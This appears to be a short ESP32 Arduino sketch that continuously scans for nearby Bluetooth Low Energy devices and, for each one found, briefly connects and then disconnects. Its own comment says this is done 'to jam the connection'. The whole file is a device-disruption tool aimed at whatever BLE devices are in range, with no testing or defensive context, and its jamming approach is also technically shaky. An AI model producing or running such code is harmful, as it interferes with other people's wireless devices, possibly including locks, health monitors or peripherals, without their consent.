#include "BLEDevice.h"
#include "BLEServer.h"
#include "BLEUtils.h"
#include "BLEScan.h"

// Set scan time to 0 seconds for continuous scanning
int scanTime = 0;

class MyAdvertisedDeviceCallbacks: public BLEAdvertisedDeviceCallbacks {
    void onResult(BLEAdvertisedDevice advertisedDevice) {
      // When a device is found, we'll try to connect to it
      BLEClient* pClient = BLEDevice::createClient();
      pClient->connect(&advertisedDevice);
      delay(100); // Brief connection
      
      // Immediately disconnect to jam the connection
      pClient->disconnect();
    }
};

void setup() {
  Serial.begin(115200);
  
  // Initialize BLE
  BLEDevice::init("");
  
  // Create scanner
  BLEScan* pBLEScan = BLEDevice::getScan();
  pBLEScan->setAdvertisedDeviceCallbacks(new MyAdvertisedDeviceCallbacks());
  pBLEScan->setActiveScan(true); // Active scan uses more power but gets results faster
  pBLEScan->setInterval(100);
  pBLEScan->setWindow(99); // Less or equal to setInterval value
}

void loop() {
  // Start scanning continuously
  BLEDevice::getScan()->start(scanTime, false);
  delay(50); // Small delay between scans
}